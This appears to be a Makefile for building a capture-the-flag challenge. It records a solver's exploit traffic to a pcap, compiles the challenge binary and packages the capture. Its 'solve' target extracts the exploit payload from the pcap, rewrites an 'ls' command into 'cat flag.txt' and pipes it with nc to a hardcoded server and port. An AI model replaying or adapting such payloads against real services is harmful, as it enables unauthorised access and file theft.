

user := 10.154.1.94
server := 165.227.210.30
port := 16306

capture:
	nohup sh -c "tcpdump -i wlp166s0 -w ./capture.pcap -W 1000 & sleep 10s; kill $$!" > /dev/null 2>&1
	nohup sh -c "sleep 1;python original_solve.py BIN=./chal.bin REMOTE" > /dev/null 2>&1

compile:
	gcc -o chal.bin chal.c -fstack-protector -no-pie
	cp chal.bin ../docker	
	sudo chown solardebris capture.pcap
	sudo chown solardebris chal.bin
	editcap -c 900 capture.pcap exploit.pcap
	rm capture.pcap
	mv exploit_00000* exploit.pcap
	rm -rf exploit_*
	cp exploit.pcap ../distrib/

get_info:
	#echo "Getting server ip"
	tshark -r exploit.pcap -Y "dns.flags.response == 1 && dns.count.answers == 1" -T fields -e dns.a -e dns.resp.name

solve:	
	echo "Sending exploit to server"
	tshark -r exploit.pcap -Y "tcp && ip.src==$(user) && ip.dst==$(server)" -T fields -e "tcp.payload" |  sed "s/6c730a/63617420666c61672e7478740a/" | grep -E "."  | xxd -r -p > payload
	cat payload | nc $(server) $(port) 

